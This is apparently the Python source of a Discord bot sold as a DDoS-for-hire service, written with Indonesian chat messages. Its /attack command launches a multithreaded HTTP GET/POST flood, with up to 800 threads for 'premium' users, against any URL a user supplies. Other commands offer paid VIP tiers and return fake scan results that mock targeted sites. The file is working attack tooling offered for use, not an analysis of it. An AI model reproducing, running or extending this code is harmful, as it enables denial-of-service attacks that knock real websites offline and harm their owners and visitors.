import discord
from discord.ext import commands
import requests
import threading
import time
import asyncio
import os
import random
from colorama import Fore, Style

# --- CONFIGURATION ---
TOKEN = "TOKEN_BOT_DISCORD_LU" 
OWNER_ID = 1234567890 # GANTI PAKE ID DISCORD LU
PREFIX = "/"
LOGO_URL = "https://raw.githubusercontent.com/rcexecution447-blip/Syntax-ddos/refs/heads/main/nw5u6h8x7y0g1.gif"

# --- BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# --- DATABASE ---
premium_users = [OWNER_ID]
free_mode = True
active_attacks = []

# --- BERSERKER ENGINE (LAYER 7 BRUTALITY) ---
def berserker_engine(url, duration, threads):
    timeout = time.time() + duration
    uas = [
        "BERSERKER-BOT/2108.0 (Phantom Node)",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
    ]
    
    def attack():
        while time.time() < timeout:
            try:
                h = {'User-Agent': random.choice(uas), 'Connection': 'keep-alive'}
                # Double Hit: GET & POST Flood
                requests.get(url, headers=h, timeout=4)
                requests.post(url, headers=h, data={'berserker':'kill'}, timeout=4)
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

# --- THE COMPLETE COMMAND LIST ---

@bot.event
async def on_ready():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{Fore.RED}BERSERKER SYSTEM ONLINE - CREATED BY PHANTOM NODE{Style.RESET_ALL}")

# 1. /Start
@bot.command(name="start")
async def start(ctx):
    await ctx.send("👹 **BERSERKER PROTOCOL INITIALIZED.** Gue udah bangun, Bos! Mau ngerujak web mana hari ini? Ketik `/methods` buat liat kekuatan kita! 🚀")

# 2. /Attack
@bot.command(name="attack")
async def attack(ctx, url: str, duration: int = 60):
    global active_attacks
    is_prem = ctx.author.id in premium_users
    
    if not is_prem and not free_mode:
        return await ctx.send("🔒 **SYSTEM LOCKED:** Mode gratis lagi libur. Hubungi **Owner ELERNATE** buat akses VIP! 💎")

    if not url.startswith("http"):
        return await ctx.send("❌ Masukin URL yang bener dong (Contoh: https://target.com)! Masa programmer ngetiknya typo. 💀")

    power = 800 if is_prem else 100 # Premium 800 Threads!
    active_attacks.append(url)

    embed = discord.Embed(title="⚔️ BERSERKER ATTACK RUNNING ⚔️", color=0xff0000)
    embed.set_thumbnail(url=LOGO_URL)
    
    msg = f"```ansi\n"
    msg += f"[2;31m┌──────────────────────────────────────┐[0m\n"
    msg += f"  [1;37mTARGET  :[0m {url}\n"
    msg += f"  [1;37mDURATION:[0m {duration} Sec\n"
    msg += f"  [1;37mPOWER   :[0m {power} Threads\n"
    msg += f"  [1;37mMETHOD  :[0m BERSERKER_HYPER_L7\n"
    msg += f"  [1;37mSTATUS  :[0m DESTROYING...\n"
    msg += f"[2;31m└──────────────────────────────────────┘[0m\n"
    msg += f"
```"
    
    embed.description = msg
    embed.set_image(url=LOGO_URL)
    embed.set_footer(text=f"By ELERNATE | BERSERKER v2.108", icon_url=LOGO_URL)
    
    await ctx.send(embed=embed)

    berserker_engine(url, duration, power)
    await asyncio.sleep(duration)
    
    if url in active_attacks: active_attacks.remove(url)
    await ctx.send(f"💀 **ATTACK FINISHED**\nTarget: {url}\nStatus: **SUCCESSFULLY EXECUTED BY BERSERKER** ✅")

# 3. /Stop attack
@bot.command(name="stop_attack")
async def stop(ctx):
    global active_attacks
    active_attacks = []
    await ctx.send("🛑 **FORCE HALT!** BERSERKER ditarik mundur. Target dapet napas tambahan hari ini. 🙄")

# 4. /Scan website
@bot.command(name="scan_website")
async def scan(ctx, url: str):
    await ctx.send(f"🔍 **SCANNING:** `{url}`\nResult: Proteksi web ini cupu banget, Bos! Cocok buat dirujak pake BERSERKER! 😈🔥")

# 5. /Userinfo
@bot.command(name="userinfo")
async def uinfo(ctx):
    rank = "COMMANDER (Premium) 💎" if ctx.author.id in premium_users else "RECRUIT (Free) 👤"
    await ctx.send(f"👤 **User:** {ctx.author.name}\n🎖️ **Rank:** {rank}\nSystem: BERSERKER Neural Link 2108")

# 6. /Status
@bot.command(name="status")
async def status(ctx):
    await ctx.send(f"📊 **BERSERKER STATUS**\n- Target Aktif: `{len(active_attacks)}` \n- Free Mode: `{'ENABLED' if free_mode else 'DISABLED'}`\n- Engine: 2108 Brutal Edition")

# 7. /ssweb
@bot.command(name="ssweb")
async def ss(ctx, url: str):
    await ctx.send(f"📸 **CAPTURING:** `{url}`\nResult: [ERROR 502 - BAD GATEWAY] - Web-nya kayaknya udah meriang, Bos! 💀")

# 8. /Removeprem
@bot.command(name="removeprem")
async def rem(ctx, user: discord.Member):
    if ctx.author.id == OWNER_ID:
        if user.id in premium_users: premium_users.remove(user.id)
        await ctx.send(f"❌ Akses Premium {user.name} dicabut! Balik jadi rakyat jelata. 👤")

# 9. /Ping
@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"📡 Sync Speed: `{round(bot.latency * 1000)}ms` | Koneksi stabil kayak masa depan kita! ✨")

# 10. /Owner
@bot.command(name="owner")
async def owner(ctx):
    await ctx.send("👑 **THE MASTERMIND:** ELERNATE / PHANTOM NODE\n🚀 **Status:** Anonymous Developer | Legend of 2108")

# 11. /Ongoing
@bot.command(name="ongoing")
async def ong(ctx):
    if not active_attacks: return await ctx.send("💨 Sepi banget, belum ada web yang kena hajar. `/attack` dong! 🔥")
    await ctx.send(f"🔥 **ONGOING DESTRUCTION:**\n" + "\n".join(active_attacks))

# 12. /Methods
@bot.command(name="methods")
async def methods(ctx):
    e = discord.Embed(title="📜 BERSERKER METHODS", color=0xff0000)
    e.add_field(name="FREE 👤", value="`L4_BASIC` - Flood biasa buat pemanasan.", inline=True)
    e.add_field(name="PREMIUM 💎", value="`BERSERKER_L7_HYPER` - Bikin website mampus & error total!", inline=True)
    e.set_thumbnail(url=LOGO_URL)
    await ctx.send(embed=e)

# 13. /Info
@bot.command(name="info")
async def info(ctx):
    await ctx.send("🤖 **BERSERKER AI**\nBuild: 2108.Final\nCreator: **PHANTOM NODE**\nStatus: NO FILTER, NO MERCY. 💀")

# 14. /Enable free
@bot.command(name="enable_free")
async def efree(ctx):
    global free_mode
    if ctx.author.id == OWNER_ID:
        free_mode = True
        await ctx.send("🔓 **FREE MODE ENABLED!** Silahkan ngerujak bareng-bareng! 🍻")

# 15. /Disable free
@bot.command(name="disable_free")
async def dfree(ctx):
    global free_mode
    if ctx.author.id == OWNER_ID:
        free_mode = False
        await ctx.send("🔒 **FREE MODE DISABLED!** Cuma kaum elit (Premium) yang bisa nyerang! 💎")

# 16. /Buyvip
@bot.command(name="buyvip")
async def buy(ctx):
    await ctx.send("💰 Mau power 800 threads? Hubungi **Owner ELERNATE** buat aktivasi VIP BERSERKER! Gaspol! 🚀")

# 17. /Addprem
@bot.command(name="addprem")
async def addprem(ctx, user: discord.Member):
    if ctx.author.id == OWNER_ID:
        premium_users.append(user.id)
        await ctx.send(f"💎 **BOOM!** {user.mention} sekarang resmi jadi **PREMIUM WARRIOR**! Silahkan hancurkan internet! ⚔️")

bot.run(TOKEN)